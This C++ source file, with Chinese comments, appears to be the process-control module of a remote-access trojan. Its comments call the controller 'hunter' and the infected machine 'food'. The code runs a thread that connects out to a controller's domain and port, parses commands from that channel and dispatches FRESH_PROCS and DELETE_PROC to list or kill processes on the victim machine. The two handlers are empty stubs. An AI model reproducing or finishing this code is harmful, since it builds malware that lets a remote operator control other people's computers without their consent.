#include "pch.h"
#include "Proc.h"

static Proc gProc;

Proc::Proc() {

	// hunter发送至食物
	CmdFreshProcs = "FRESH_PROCS";
	CmdDeleteProc = "DELETE_PROC";
	// 食物发送至hunter
	CmdSendProcs = "SEND_PROCS";
	CmdKillProcSuccess = "KILL_SUCCESS";
	CmdKillProcFailed = "KILL_FAILED";
	// 分割与结束符
	CmdSplit = ";";
	CmdEnd = "\r\n";
	CmdFileSplit = "|";
}

void Proc::startByNewThread(std::string domain, int port)
{
	// 将域名和端口合并为一个char*
	// 这里new出来的空间在fileThreadProc中delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// 传入刚出炉的char*参数
	HANDLE h = CreateThread(NULL, 0, Proc::procThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Proc::procThreadProc(LPVOID args)
{
	// 获取传入的域名和端口信息
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startProc(domain, port);
	// 不忘记delete
	delete [] (char*)args;
	return true;
}

void Proc::startProc(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for proc\r\n");
	}

	OutputDebugStringA("Started proc\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// 无数据会引起阻塞 防止占用cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// 将收到的数据加入到buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished file\r\n");
}


void Proc::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// 分割每条命令和参数并执行
	int endIndex;
	while ((endIndex = buf.find(gProc.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gProc.CmdEnd.length());

		int firstSplit = line.find(gProc.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gProc.CmdSplit.length());
		// 执行本命令
		processCmd(sock, cmd, line);
	}
}

// 解析出参数 返回映射 和食物主线程里的解析是一样的道理
std::map<std::string, std::string> Proc::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gProc.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gProc.CmdSplit.size();
		pos2 = data.find(gProc.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gProc.CmdFreshProcs) {
		doFreshProcs(sock, args);
		return;
	}

	if (cmd == gProc.CmdDeleteProc) {
		doKillProc(sock, args);
		return;
	}
}

void Proc::doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args) {

}

void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {

}
